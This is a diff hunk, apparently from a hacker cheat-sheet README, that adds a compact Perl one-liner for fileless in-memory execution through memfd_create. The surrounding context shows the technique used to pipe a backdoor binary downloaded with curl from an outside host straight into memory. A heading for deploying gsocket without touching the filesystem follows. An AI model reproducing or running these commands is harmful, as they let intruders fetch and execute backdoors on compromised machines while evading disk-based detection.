@@ -2040,6 +2040,12 @@ exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
 # cat /usr/bin/id | memexec -u
 # curl -SsfL https://thc.org/my-backdoor-binary | memexec
 ```
+
+The shortest possible variant is (example):
+```shell
+MX=("perl" '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' "--")
+# Example: cat /usr/bin/id | "${MX[@]}" -u
+```
 (Thank you [tmp.Out](https://tmpout.sh/) for some educated discussions)
 
 Deploy gsocket without writing to the filesystem (example):
